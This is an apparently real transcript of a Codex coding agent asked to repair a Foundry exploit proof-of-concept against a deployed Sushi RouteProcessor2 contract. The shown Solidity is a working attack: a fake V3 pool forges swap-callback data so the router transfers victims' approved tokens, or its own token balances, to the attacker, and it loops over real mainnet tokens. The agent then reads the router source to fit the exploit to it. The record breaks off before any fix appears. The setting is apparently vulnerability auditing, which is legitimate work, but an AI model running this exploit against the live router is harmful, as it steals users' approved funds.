@@ -1,0 +1,4822 @@
+OpenAI Codex v0.130.0
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR, /Users/zhanglongqin/.codex/memories]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e3422-d9c1-7541-ad3e-c7d91fd934eb
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: direct_or_existing_balance_first
+- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Arbitrary V3-style pools can forge callbacks and steal approved user funds
+- claim: `swapUniV3` and `swapTridentCL` accept arbitrary pool addresses from the route, then authenticate callbacks only by checking `msg.sender == lastCalledPool`. The callbacks also trust the caller-controlled `data` blob to choose both `tokenIn` and `from`. A malicious pool can therefore be inserted into a route, call the callback with forged `(token, victim)` data, and make the router execute `safeTransferFrom(victim, maliciousPool, amount)` for any ERC20 the victim has approved to the router. The same primitive can pull router-held ERC20s by forging `from = address(this)`.
+- impact: Any address that has approved the router can be drained without participating in the attack. Router-held ERC20 balances can also be stolen. This is direct theft, not just bad pricing or a malicious route causing the caller to lose their own intended input.
+- exploit_paths: ["Attacker deploys a fake contract implementing the UniswapV3 or TridentCL `swap` entrypoint.", "Attacker submits a route whose V3/CL hop points to that fake pool.", "After `lastCalledPool` is set, the fake pool invokes `uniswapV3SwapCallback` or `tridentCLSwapCallback` with positive deltas and forged `abi.encode(token, victim)` data.", "The callback transfers the victim's approved tokens, or router-held tokens, directly to the attacker-controlled pool."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.10;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IRouteProcessor2 {
+    function processRoute(
+        address tokenIn,
+        uint256 amountIn,
+        address tokenOut,
+        uint256 amountOutMin,
+        address to,
+        bytes calldata route
+    ) external payable returns (uint256 amountOut);
+
+    function uniswapV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata data
+    ) external;
+}
+
+contract MaliciousV3Pool {
+    address internal immutable VERIFIER;
+    address internal immutable TARGET_ROUTER;
+
+    address internal forgedToken;
+    address internal forgedFrom;
+    address internal beneficiary;
+
+    constructor(address verifier_, address router_) {
+        VERIFIER = verifier_;
+        TARGET_ROUTER = router_;
+    }
+
+    function configure(address token_, address from_, address beneficiary_) external {
+        require(msg.sender == VERIFIER, "not verifier");
+        forgedToken = token_;
+        forgedFrom = from_;
+        beneficiary = beneficiary_;
+    }
+
+    function swap(
+        address,
+        bool,
+        int256 amountSpecified,
+        uint160,
+        bytes calldata
+    ) external returns (int256 amount0, int256 amount1) {
+        require(msg.sender == TARGET_ROUTER, "not router");
+        require(amountSpecified >= 0, "negative amount");
+
+        uint256 amountToPull = _toUint(amountSpecified);
+        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+            _toInt(amountToPull),
+            int256(0),
+            abi.encode(forgedToken, forgedFrom)
+        );
+
+        uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+        if (stolen > 0) {
+            _safeTransfer(forgedToken, beneficiary, stolen);
+        }
+
+        return (_toInt(amountToPull), -_toInt(stolen));
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+
+    function _toUint(int256 value) internal pure returns (uint256) {
+        require(value >= 0, "negative cast");
+        return uint256(value);
+    }
+
+    function _toInt(uint256 value) internal pure returns (int256) {
+        require(value <= uint256(type(int256).max), "int overflow");
+        return int256(value);
+    }
+}
+
+contract FlawVerifier {
+    address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+
+    address internal immutable POOL;
+
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+
+    address public configuredVictim;
+    address public configuredVictimToken;
+
+    constructor() {
+        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
+    }
+
+    function executeOnOpportunity() external {
+        if (_profitAmount > 0) {
+            return;
+        }
+
+        if (_drainRouterBalances()) {
+            return;
+        }
+
+        if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+            _attemptVictimDrain(configuredVictim, configuredVictimToken);
+        }
+    }
+
+    function configureVictim(address victim, address token) external {
+        configuredVictim = victim;
+        configuredVictimToken = token;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _drainRouterBalances() internal returns (bool) {
+        address[16] memory candidates = [
+            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
+            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
+        ];
+
+        for (uint256 i = 0; i < candidates.length; ++i) {
+            uint256 routerBalance = IERC20(candidates[i]).balanceOf(ROUTER);
+            if (routerBalance <= 1) {
+                continue;
+            }
+
+            if (_attemptRouterDrain(candidates[i])) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    function _attemptRouterDrain(address token) internal returns (bool) {
+        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
+
+        bytes memory route = _buildRoute(token);
+        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+            if (afterBalance > beforeBalance) {
+                _profitToken = token;
+                _profitAmount = afterBalance - beforeBalance;
+                return true;
+            }
+        } catch {}
+
+        return false;
+    }
+
+    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
+        uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+        uint256 balance = IERC20(token).balanceOf(victim);
+        uint256 amountToPull = allowance < balance ? allowance : balance;
+
+        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+        if (amountToPull == 0) {
+            return false;
+        }
+
+        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+        MaliciousV3Pool(POOL).configure(token, victim, address(this));
+
+        bytes memory route = _buildForgedUserRoute(token);
+        try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+            if (afterBalance > beforeBalance) {
+                _profitToken = token;
+                _profitAmount = afterBalance - beforeBalance;
+                return true;
+            }
+        } catch {}
+
+        return false;
+    }
+
+    function _buildRoute(address token) internal view returns (bytes memory) {
+        return abi.encodePacked(
+            bytes1(uint8(1)),
+            bytes20(token),
+            bytes1(uint8(1)),
+            bytes2(uint16(65535)),
+            bytes1(uint8(1)),
+            bytes20(POOL),
+            bytes1(uint8(1)),
+            bytes20(address(this))
+        );
+    }
+
+    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
+        return abi.encodePacked(
+            bytes1(uint8(2)),
+            bytes20(token),
+            bytes1(uint8(1)),
+            bytes2(uint16(65535)),
+            bytes1(uint8(1)),
+            bytes20(POOL),
+            bytes1(uint8(1)),
+            bytes20(address(this))
+        );
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: lastcalledpool, tridentclswapcallback, abi.encode(token, victim)
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+codex
+I’m checking the local repo for the router interfaces and route encoding so I can fix the PoC without changing the exploit’s causality.
+exec
+/bin/bash -lc 'rg -n "lastCalledPool|uniswapV3SwapCallback|tridentCLSwapCallback|processRoute|swapUniV3|swapTridentCL" .' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+./src/FlawVerifier.sol:11:    function processRoute(
+./src/FlawVerifier.sol:20:    function uniswapV3SwapCallback(
+./src/FlawVerifier.sol:58:        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+./src/FlawVerifier.sol:169:        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+./src/FlawVerifier.sol:197:        try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+./out/FlawVerifier.sol/IRouteProcessor2.json:1:{"abi":[{"type":"function","name":"processRoute","inputs":[{"name":"tokenIn","type":"address","internalType":"address"},{"name":"amountIn","type":"uint256","internalType":"uint256"},{"name":"tokenOut","type":"address","internalType":"address"},{"name":"amountOutMin","type":"uint256","internalType":"uint256"},{"name":"to","type":"address","internalType":"address"},{"name":"route","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"amountOut","type":"uint256","internalType":"uint256"}],"stateMutability":"payable"},{"type":"function","name":"uniswapV3SwapCallback","inputs":[{"name":"amount0Delta","type":"int256","internalType":"int256"},{"name":"amount1Delta","type":"int256","internalType":"int256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"deployedBytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"methodIdentifiers":{"processRoute(address,uint256,address,uint256,address,bytes)":"2646478b","uniswapV3SwapCallback(int256,int256,bytes)":"fa461e33"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenIn\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountIn\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"tokenOut\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountOutMin\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"route\",\"type\":\"bytes\"}],\"name\":\"processRoute\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amountOut\",\"type\":\"uint256\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int256\",\"name\":\"amount0Delta\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"amount1Delta\",\"type\":\"int256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"uniswapV3SwapCallback\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/FlawVerifier.sol\":\"IRouteProcessor2\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/FlawVerifier.sol\":{\"keccak256\":\"0x395091b43f7ce796684b2221985a5b5a98af749593cd58e9be1b46d3b5813e59\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://fad168429e2b81f1cc98fb4f8feafb10db9e306c2e2ebef77aac3b5190b0df30\",\"dweb:/ipfs/QmNbEm4i2u5WUQwWjwvGHF1eRcXXPQuvjdeKvRakVRvivj\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.10+commit.fc410830"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"bytes","name":"route","type":"bytes"}],"stateMutability":"payable","type":"function","name":"processRoute","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}]},{"inputs":[{"internalType":"int256","name":"amount0Delta","type":"int256"},{"internalType":"int256","name":"amount1Delta","type":"int256"},{"internalType":"bytes","name":"data","type":"bytes"}],"stateMutability":"nonpayable","type":"function","name":"uniswapV3SwapCallback"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":true,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/FlawVerifier.sol":"IRouteProcessor2"},"evmVersion":"london","libraries":{}},"sources":{"src/FlawVerifier.sol":{"keccak256":"0x395091b43f7ce796684b2221985a5b5a98af749593cd58e9be1b46d3b5813e59","urls":["bzz-raw://fad168429e2b81f1cc98fb4f8feafb10db9e306c2e2ebef77aac3b5190b0df30","dweb:/ipfs/QmNbEm4i2u5WUQwWjwvGHF1eRcXXPQuvjdeKvRakVRvivj"],"license":"UNLICENSED"}},"version":1},"id":0}
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:29:  address private lastCalledPool;
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:41:    lastCalledPool = IMPOSSIBLE_POOL_ADDRESS;
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:53:  function processRoute(
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:61:    return processRouteInternal(tokenIn, amountIn, tokenOut, amountOutMin, to, route);
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:72:  function transferValueAndprocessRoute(
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:84:    return processRouteInternal(tokenIn, amountIn, tokenOut, amountOutMin, to, route);
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:93:  function processRouteInternal(
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:205:    else if (poolType == 1) swapUniV3(stream, from, tokenIn, amountIn);
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:209:    else if (poolType == 5) swapTridentCL(stream, from, tokenIn, amountIn);
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:310:  function swapUniV3(uint256 stream, address from, address tokenIn, uint256 amountIn) private {
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:315:    lastCalledPool = pool;
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:323:    require(lastCalledPool == IMPOSSIBLE_POOL_ADDRESS, 'RouteProcessor.swapUniV3: unexpected'); // Just to be sure
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:335:  function uniswapV3SwapCallback(
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:340:    require(msg.sender == lastCalledPool, 'RouteProcessor.uniswapV3SwapCallback: call from unknown source');
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:341:    lastCalledPool = IMPOSSIBLE_POOL_ADDRESS;
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:344:    require(amount > 0, 'RouteProcessor.uniswapV3SwapCallback: not positive amount');
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:355:  function swapTridentCL(uint256 stream, address from, address tokenIn, uint256 amountIn) private {
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:360:    lastCalledPool = pool;
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:369:    require(lastCalledPool == IMPOSSIBLE_POOL_ADDRESS, 'RouteProcessor.swapTridentCL: unexpected'); // Just to be sure
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:381:  function tridentCLSwapCallback(
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:386:    require(msg.sender == lastCalledPool, 'RouteProcessor.TridentCLSwapCallback: call from unknown source');
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol:387:    lastCalledPool = IMPOSSIBLE_POOL_ADDRESS;
+
+exec
+/bin/bash -lc 'rg --files .' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+./src/FlawVerifier.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/interfaces/IUniswapV2Pair.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/interfaces/IBentoBoxMinimal.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/interfaces/IUniswapV3Pool.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/interfaces/IPool.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/interfaces/ITridentCLPool.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/interfaces/IWETH.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/_etherscan_meta.json
+./0x044b75f554b886a065b9567891e45c79542d7357/@openzeppelin/contracts/utils/Address.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol
+./0x044b75f554b886a065b9567891e45c79542d7357/@openzeppelin/contracts/token/ERC20/IERC20.sol
+./cache/solidity-files-cache.json
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/InputStream.sol
+./_index.json
+./0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol
+./foundry.toml
+./out/build-info/340655660b30ada3.json
+./out/Probe.t.sol/ProbeTest.json
+./out/Probe.t.sol/Vm.json
+./out/Probe.t.sol/IERC20Probe.json
+./out/FlawVerifier.sol/FlawVerifier.json
+./out/FlawVerifier.sol/IERC20.json
+./out/FlawVerifier.sol/MaliciousV3Pool.json
+./out/FlawVerifier.sol/IRouteProcessor2.json
+
+codex
+I found the verified router source locally. Next I’m matching the exact V3 and Trident CL route format and callback expectations so the verifier tracks the real control flow instead of guessing.
+exec
+/bin/bash -lc "sed -n '300,395p' 0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+    }
+    
+    IPool(pool).swap(swapData);
+  }
+
+  /// @notice UniswapV3 pool swap
+  /// @param stream [pool, direction, recipient]
+  /// @param from Where to take liquidity for swap
+  /// @param tokenIn Input token
+  /// @param amountIn Amount of tokenIn to take for swap
+  function swapUniV3(uint256 stream, address from, address tokenIn, uint256 amountIn) private {
+    address pool = stream.readAddress();
+    bool zeroForOne = stream.readUint8() > 0;
+    address recipient = stream.readAddress();
+
+    lastCalledPool = pool;
+    IUniswapV3Pool(pool).swap(
+      recipient,
+      zeroForOne,
+      int256(amountIn),
+      zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1,
+      abi.encode(tokenIn, from)
+    );
+    require(lastCalledPool == IMPOSSIBLE_POOL_ADDRESS, 'RouteProcessor.swapUniV3: unexpected'); // Just to be sure
+  }
+
+  /// @notice Called to `msg.sender` after executing a swap via IUniswapV3Pool#swap.
+  /// @dev In the implementation you must pay the pool tokens owed for the swap.
+  /// The caller of this method must be checked to be a UniswapV3Pool deployed by the canonical UniswapV3Factory.
+  /// amount0Delta and amount1Delta can both be 0 if no tokens were swapped.
+  /// @param amount0Delta The amount of token0 that was sent (negative) or must be received (positive) by the pool by
+  /// the end of the swap. If positive, the callback must send that amount of token0 to the pool.
+  /// @param amount1Delta The amount of token1 that was sent (negative) or must be received (positive) by the pool by
+  /// the end of the swap. If positive, the callback must send that amount of token1 to the pool.
+  /// @param data Any data passed through by the caller via the IUniswapV3PoolActions#swap call
+  function uniswapV3SwapCallback(
+    int256 amount0Delta,
+    int256 amount1Delta,
+    bytes calldata data
+  ) external {
+    require(msg.sender == lastCalledPool, 'RouteProcessor.uniswapV3SwapCallback: call from unknown source');
+    lastCalledPool = IMPOSSIBLE_POOL_ADDRESS;
+    (address tokenIn, address from) = abi.decode(data, (address, address));
+    int256 amount = amount0Delta > 0 ? amount0Delta : amount1Delta;
+    require(amount > 0, 'RouteProcessor.uniswapV3SwapCallback: not positive amount');
+
+    if (from == address(this)) IERC20(tokenIn).safeTransfer(msg.sender, uint256(amount));
+     else IERC20(tokenIn).safeTransferFrom(from, msg.sender, uint256(amount));
+  }
+
+  /// @notice TridentCL pool swap
+  /// @param stream [pool, direction, recipient]
+  /// @param from Where to take liquidity for swap
+  /// @param tokenIn Input token
+  /// @param amountIn Amount of tokenIn to take for swap
+  function swapTridentCL(uint256 stream, address from, address tokenIn, uint256 amountIn) private {
+    address pool = stream.readAddress();
+    bool zeroForOne = stream.readUint8() > 0;
+    address recipient = stream.readAddress();
+
+    lastCalledPool = pool;
+    ITridentCLPool(pool).swap(
+      recipient,
+      zeroForOne,
+      int256(amountIn),
+      zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1,
+      false,
+      abi.encode(tokenIn, from)
+    );
+    require(lastCalledPool == IMPOSSIBLE_POOL_ADDRESS, 'RouteProcessor.swapTridentCL: unexpected'); // Just to be sure
+  }
+
+  /// @notice Called to `msg.sender` after executing a swap via ITridentCLPool#swap.
+  /// @dev In the implementation you must pay the pool tokens owed for the swap.
+  /// The caller of this method must be checked to be a TridentCLPool deployed by the canonical TridentCLFactory.
+  /// amount0Delta and amount1Delta can both be 0 if no tokens were swapped.
+  /// @param amount0Delta The amount of token0 that was sent (negative) or must be received (positive) by the pool by
+  /// the end of the swap. If positive, the callback must send that amount of token0 to the pool.
+  /// @param amount1Delta The amount of token1 that was sent (negative) or must be received (positive) by the pool by
+  /// the end of the swap. If positive, the callback must send that amount of token1 to the pool.
+  /// @param data Any data passed through by the caller via the ITridentCLPoolActions#swap call
+  function tridentCLSwapCallback(
+    int256 amount0Delta,
+    int256 amount1Delta,
+    bytes calldata data
+  ) external {
+    require(msg.sender == lastCalledPool, 'RouteProcessor.TridentCLSwapCallback: call from unknown source');
+    lastCalledPool = IMPOSSIBLE_POOL_ADDRESS;
+    (address tokenIn, address from) = abi.decode(data, (address, address));
+    int256 amount = amount0Delta > 0 ? amount0Delta : amount1Delta;
+    require(amount > 0, 'RouteProcessor.TridentCLSwapCallback: not positive amount');
+
+    if (from == address(this)) IERC20(tokenIn).safeTransfer(msg.sender, uint256(amount));
+     else IERC20(tokenIn).safeTransferFrom(from, msg.sender, uint256(amount));
+  }
+}
+
+exec
+/bin/bash -lc "sed -n '180,235p' 0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+  /// @param stream Streamed process program
+  function processInsideBento(uint256 stream) private {
+    address token = stream.readAddress();
+    uint8 num = stream.readUint8();
+
+    uint256 amountTotal = bentoBox.balanceOf(token, address(this));
+    unchecked {
+      if (amountTotal > 0) amountTotal -= 1;     // slot undrain protection
+      for (uint256 i = 0; i < num; ++i) {
+        uint16 share = stream.readUint16();
+        uint256 amount = (amountTotal * share) / 65535;
+        amountTotal -= amount;
+        swap(stream, address(this), token, amount);
+      }
+    }
+  }
+
+  /// @notice Makes swap
+  /// @param stream Streamed process program
+  /// @param from Where to take liquidity for swap
+  /// @param tokenIn Input token
+  /// @param amountIn Amount of tokenIn to take for swap
+  function swap(uint256 stream, address from, address tokenIn, uint256 amountIn) private {
+    uint8 poolType = stream.readUint8();
+    if (poolType == 0) swapUniV2(stream, from, tokenIn, amountIn);
+    else if (poolType == 1) swapUniV3(stream, from, tokenIn, amountIn);
+    else if (poolType == 2) wrapNative(stream, from, tokenIn, amountIn);
+    else if (poolType == 3) bentoBridge(stream, from, tokenIn, amountIn);
+    else if (poolType == 4) swapTrident(stream, from, tokenIn, amountIn);
+    else if (poolType == 5) swapTridentCL(stream, from, tokenIn, amountIn);
+    else revert('RouteProcessor: Unknown pool type');
+  }
+
+  /// @notice Wraps/unwraps native token
+  /// @param stream [direction & fake, recipient, wrapToken?]
+  /// @param from Where to take liquidity for swap
+  /// @param tokenIn Input token
+  /// @param amountIn Amount of tokenIn to take for swap
+  function wrapNative(uint256 stream, address from, address tokenIn, uint256 amountIn) private {
+    uint8 directionAndFake = stream.readUint8();
+    address to = stream.readAddress();
+
+    if (directionAndFake & 1 == 1) {  // wrap native
+      address wrapToken = stream.readAddress();
+      if (directionAndFake & 2 == 0) IWETH(wrapToken).deposit{value: amountIn}();
+      if (to != address(this)) IERC20(wrapToken).safeTransfer(to, amountIn);
+    } else { // unwrap native
+      if (directionAndFake & 2 == 0) {
+        if (from != address(this)) IERC20(tokenIn).safeTransferFrom(from, address(this), amountIn);
+        IWETH(tokenIn).withdraw(amountIn);
+      }
+      payable(to).transfer(address(this).balance);
+    }
+  }
+
+  /// @notice Bridge/unbridge tokens to/from Bento
+
+exec
+/bin/bash -lc "sed -n '1,140p' 0x044b75f554b886a065b9567891e45c79542d7357/contracts/InputStream.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity 0.8.10;
+
+library InputStream {
+  function createStream(bytes memory data) internal pure returns (uint256 stream) {
+    assembly {
+      stream := mload(0x40)
+      mstore(0x40, add(stream, 64))
+      mstore(stream, data)
+      let length := mload(data)
+      mstore(add(stream, 32), add(data, length))
+    }
+  }
+
+  function isNotEmpty(uint256 stream) internal pure returns (bool) {
+    uint256 pos;
+    uint256 finish;
+    assembly {
+      pos := mload(stream)
+      finish := mload(add(stream, 32))
+    }
+    return pos < finish;
+  }
+
+  function readUint8(uint256 stream) internal pure returns (uint8 res) {
+    assembly {
+      let pos := mload(stream)
+      pos := add(pos, 1)
+      res := mload(pos)
+      mstore(stream, pos)
+    }
+  }
+
+  function readUint16(uint256 stream) internal pure returns (uint16 res) {
+    assembly {
+      let pos := mload(stream)
+      pos := add(pos, 2)
+      res := mload(pos)
+      mstore(stream, pos)
+    }
+  }
+
+  function readUint32(uint256 stream) internal pure returns (uint32 res) {
+    assembly {
+      let pos := mload(stream)
+      pos := add(pos, 4)
+      res := mload(pos)
+      mstore(stream, pos)
+    }
+  }
+
+  function readUint(uint256 stream) internal pure returns (uint256 res) {
+    assembly {
+      let pos := mload(stream)
+      pos := add(pos, 32)
+      res := mload(pos)
+      mstore(stream, pos)
+    }
+  }
+
+  function readAddress(uint256 stream) internal pure returns (address res) {
+    assembly {
+      let pos := mload(stream)
+      pos := add(pos, 20)
+      res := mload(pos)
+      mstore(stream, pos)
+    }
+  }
+
+  function readBytes(uint256 stream) internal pure returns (bytes memory res) {
+    assembly {
+      let pos := mload(stream)
+      res := add(pos, 32)
+      let length := mload(res)
+      mstore(stream, add(res, length))
+    }
+  }
+}
+
+web search: 
+web search: 
+codex
